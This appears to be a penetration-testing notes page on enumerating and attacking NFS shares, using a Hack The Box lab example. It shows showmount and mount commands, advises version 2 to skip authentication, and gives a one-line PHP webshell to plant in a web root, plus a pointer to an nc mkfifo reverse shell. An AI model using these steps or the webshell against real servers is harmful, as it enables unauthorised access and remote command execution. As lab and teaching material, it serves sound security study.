## Enumeration

* Open NFSâ€™s work by utilizing read/write access permissions.
  * Read Access: Possible confidential file is available
  * Write Access: Possible file upload to execute through web service

### Useful Nmap Scripts <a href="#useful-nmap-scripts" id="useful-nmap-scripts"></a>

```
nfs-ls #List NFS exports and check permissions
nfs-showmount #Like showmount -e
nfs-statfs #Disk statistics and info from NFS share
```

## Mounting

To know **which folder** has the server **available** to mount you an ask it using:

```
showmount -e <IP>
```

Then mount it using:

```
mount -t nfs [-o vers=2] <ip>:<remote_folder> <local_folder> -o nolock
```

You should specify to **use version 2** because it doesn't have **any** **authentication** or **authorization**.

**Example:**

**Enumerate share:**

```
showmount -e 10.10.10.10
Export list for 10.10.10.10:
/site_backups (everyone)
```

Create directory for mount point:

```
sudo mkdir /mnt/HTB_Site_Backups
```

Mount the share to newly created mount point:

```
sudo mount -t nfs 10.10.10.10:/site_backups /mnt/HTB_Site_Backups/ -o nolock
```

## Exploitation Tips

* When you mount a directory, be sure to check the directory for it's permissions
* The mounted directory does not check the user, it simply checks it's permissions
* This means that if you create a user with the same permissions set, you will be able to read, write, or execute those files found within those directories
* Perhaps there's a web server running on that server and a mounted directory is /var/www/html, well if you can write to it, place a PHP webshell in there, and gain access to the server!

#### PHP Webshell

* An extremely simple PHP Webshell
* To use, simple name the file shell.php and place it in /var/www/html

```
<?php system($_GET['cmd']);?>
```

* Navigate to hackthebox.htb/shell.php?cmd=\<reverse shell here>
* I always found the most consistent way to catch a reverse shell is with the nc mkfifo reverse shell

## Tools:

Mount: For mounting share availability

Showmount: For finding shares available
